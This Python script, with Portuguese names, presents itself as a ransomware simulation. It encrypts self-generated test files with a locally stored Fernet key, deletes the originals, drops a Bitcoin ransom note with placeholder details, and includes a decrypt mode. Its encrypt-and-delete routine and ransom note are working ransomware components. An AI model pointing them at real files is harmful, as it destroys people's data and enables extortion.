from cryptography.fernet import Fernet
import os
from pathlib import Path
import sys

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave_secreta.key", "wb") as f:
        f.write(chave)
    return chave

def carregar_chave():
    if not os.path.exists("chave_secreta.key"):
        return gerar_chave()
    return open("chave_secreta.key", "rb").read()

def criptografar_arquivo(caminho_arquivo, chave):
    fernet = Fernet(chave)
    with open(caminho_arquivo, 'rb') as file:
        dados = file.read()
    dados_criptografados = fernet.encrypt(dados)
    with open(caminho_arquivo + '.encrypted', 'wb') as file:
        file.write(dados_criptografados)
    os.remove(caminho_arquivo)

def descriptografar_arquivo(caminho_criptografado, chave):
    fernet = Fernet(chave)
    with open(caminho_criptografado, 'rb') as file:
        dados_cript = file.read()
    dados_originais = fernet.decrypt(dados_cript)
    caminho_original = caminho_criptografado.replace('.encrypted', '')
    with open(caminho_original, 'wb') as file:
        file.write(dados_originais)
    os.remove(caminho_criptografado)

def criar_mensagem_resgate():
    mensagem = """
    ==================================================================
    SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
    
    Para recuperar seus dados, envie 0.05 Bitcoin para:
    bc1qexemplo123456789abcdefghijklmnopqrstuv
    
    Após o pagamento, envie o comprovante para: ransom@falso.com
    Chave de descriptografia será enviada em até 24h.
    
    NÃO tente recuperar sozinho ou perderá tudo permanentemente!
    ==================================================================
    """
    with open("RESGATE_LEIA_ISTO.txt", "w", encoding="utf-8") as f:
        f.write(mensagem)

def main():
    print("[+] Iniciando simulação de ransomware (ambiente controlado)")
    
    test_dir = Path("test_files")
    test_dir.mkdir(parents=True, exist_ok=True)
    
    for i in range(5):
        arquivo = test_dir / f"documento_importante_{i+1}.txt"
        arquivo.write_text(f"Este é um arquivo muito importante número {i+1}. Confidencial!", encoding="utf-8")
    
    chave = carregar_chave()
    
    for arquivo in test_dir.glob("*.txt"):
        print(f"[+] Criptografando: {arquivo}")
        criptografar_arquivo(str(arquivo), chave)
    
    criar_mensagem_resgate()
    print("[!] Simulação concluída. Arquivos criptografados.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "decrypt":
        chave = carregar_chave()
        for arquivo in Path("test_files").glob("*.encrypted"):
            print(f"[+] Descriptografando: {arquivo}")
            descriptografar_arquivo(str(arquivo), chave)
        print("[+] Todos os arquivos recuperados!")
    else:
        main()
